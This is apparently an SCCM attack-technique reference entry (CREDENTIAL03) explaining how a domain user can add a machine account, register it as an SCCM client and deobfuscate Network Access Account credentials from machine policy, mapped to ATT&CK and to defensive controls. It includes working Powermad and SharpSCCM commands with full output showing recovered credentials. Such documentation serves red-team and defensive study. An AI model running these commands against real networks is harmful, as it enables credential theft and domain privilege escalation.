# Technique Name
Request and deobfuscate machine policy to retrieve credential material

## Code Name
- CREDENTIAL03

## ATT&CK TTPs
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [T1555 - Passwords from Password Stores](https://attack.mitre.org/techniques/T1555/)

## Required Privilege / Context
- Domain authentication

## Summary
The network access account (NAA) is an account that can be configured on the SCCM site server. The NAA is used  to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Upon receipt, the client will encrypt the NAA using the Data Protection API (DPAPI). But what happens before that? How are the secrets protected in transit before the client protects them with DPAPI?

The client's first step is to request a list of available policies. For this technique, only `NAAConfig` is covered. The `NAAConfig` policy contains the obfuscated NAA credentials. To request this policy, the request headers must contain some important information, all of which is available at this stage.

This policy endpoint also requires authentication. Specifically, it requires authentication as an SCCM client in an `Approved` status. SCCM's default setting is `Automatically approve computers in trusted domains (recommended)`. This means the MP will automatically approve any client registration requests from computers in a trusted domain, such as the MP's domain.

There are two options for the next step:
1) compromise a computer account, such as local privilege escalation
2) add a computer account to the domain.

Option 2 is possible if the domain's `MachineAccountQuota` attribute is set to any value greater than `0` (the default value is `10`). Various tooling, such as Kevin Robertson's [Powermad](https://github.com/Kevin-Robertson/Powermad) can be used to add a computer account.

The `Default Domain Policy > Computer Configuration > Policies > Windows Settings > Security Settings > User Rights Assignment > Add workstations to domain` GPO can also be configured to a non-default principal (something other than `Domain Users`). If permission to add a computer object is denied and `MachineAccountQuota` is a non-zero value, it is likely this GPO is the culprit.

With this domain computer context, the computer can be registered as a client which will be automatically approved, then policy can be requested and deobfuscated, as discovered and published by Adam Chester in his [blog](https://blog.xpnsec.com/unobfuscating-network-access-accounts/) and [tool](https://github.com/xpn/sccmwtf).

This technique has also been built into [SharpSCCM](https://github.com/Mayyhem/SharpSCCM/wiki/get#get-naa--get-secrets) with the `get secrets` and `get naa` commands.

The `get secrets` command extends this technique to retrieve NAAs, collection variables, and task sequences.


## Impact
In environments using Active Directory defaults, SCCM defaults, and NAAs, any domain-authenticated user may create a computer object, register it as an SCCM client, request the NAA policy, and deobfuscated the credentials.

If the NAA is implementely under the principle of least privilege, this may not extend the attacker's privilege level in the domain.  The more common result: If the NAA is over-privileged, this technique serves as a trivial privilege escalation vector.

## Defensive IDs
- [PROTECT04](../../defense-techniques/PROTECT04/protect04-description.md)
- [PROTECT05](../../defense-techniques/PROTECT05/protect05-description.md)
- [PROTECT11](../../defense-techniques/PROTECT11/protect11-description.md)

## Examples
- Using Powermad and SharpSCCM
```
Import-Module .\Powermad.psm1
New-MachineAccount -MachineAccount chell$
Enter a password for the new machine account: ********
[+] Machine account chell$ added

.\SharpSCCM.exe get secrets -r newdevice -u chell$ -p <password>

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SITE-SERVER.APERTURE.LOCAL
[+] Site code: PS1
[+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
[+] Reusable Base64-encoded certificate:

    308209D20201033082098E06092A864886F70D010701A082097F0482097B308209773082059006092A864886F70D010701A08205810482057D3082057930820575060B2A864886F70D010C0A0...7C774335FF3E3CFF78303B301F300706052B0E03021A04143E425851728AA802C85337E75D471A47A1C3D9C004147C30C849A46B55FFC1D3A1A2364D506B350C28E9020207D0

[+] Discovering local properties for client registration request
[+] Modifying client registration request properties:
      FQDN: newdevice
      NetBIOS name: newdevice
      Authenticating as: chell$
      Site code: PS1
[+] Sending HTTP registration request to SITE-SERVER.APERTURE.LOCAL:80
[+] Received unique SMS client GUID for new device:

    GUID:72C913C4-F54F-4A07-9EED-918DC07F7EAD

[+] Obtaining Full Machine policy assignment from SITE-SERVER.APERTURE.LOCAL PS1
[+] Found 43 policy assignments
[+] Found policy containing secrets:
      ID: {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
      Flags: RequiresAuth, Secret, IntranetOnly, PersistWholePolicy
      URL: http://<mp>/SMS_MP/.sms_pol?{c6fe32fb-7e9c-4776-abe3-2a6d107447f1}.2_00
[+] Adding authentication headers to download request:
      ClientToken: GUID:72C913C4-F54F-4A07-9EED-918DC07F7EAD;2023-10-26T19:06:06Z
      ClientTokenSignature: 87F9D5EB1F1A951B9C93C569357896169B35CFA0BA3FEB150725B2B30DE7EAC58DA8F64D149ADBD5694BC3BE144B16AAF17D239A63D7035DFDB50B74A8FB66B66965FE8BDBB0AF9785840BED46B4E2471CA00D5C9C4D278206398B5E03228DCC8E9381D7388A5D4AD67BCF03B8E45C1EA538C1639012EC1BA434E0BBAAB6EEE990E9469A7BD275279B86FDB3A4FD2BF701ADCB8416F0797BB461BE15A5B274B373C1FC3347C68C0EB3C1F48B7DD357618E4B875CEE432ACC35321D62A6657E1994D646EB0D4EAFDDEB1F54AC0A2A6E8EE0113EB2761B9B35DF32568787BA23FF3A2A9C5B4A666409C1DEB8C09B597D69B973D807F14C973123B2284766033B70
[+] Received encoded response from server for policy {c6fe32fb-7e9c-4776-abe3-2a6d107447f1}
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>
NetworkAccessUsername: APERTURE\networkaccess
NetworkAccessPassword: <password>

[+] Completed execution in 00:00:05.9045603
```


## References
- Adam Chester, Unobfuscating Network Access Accounts, https://blog.xpnsec.com/unobfuscating-network-access-accounts/
- Adam Chester, sccmwtf, https://github.com/xpn/sccmwtf
- Chris Thompson, SharpSCCM, https://github.com/Mayyhem/SharpSCCM/
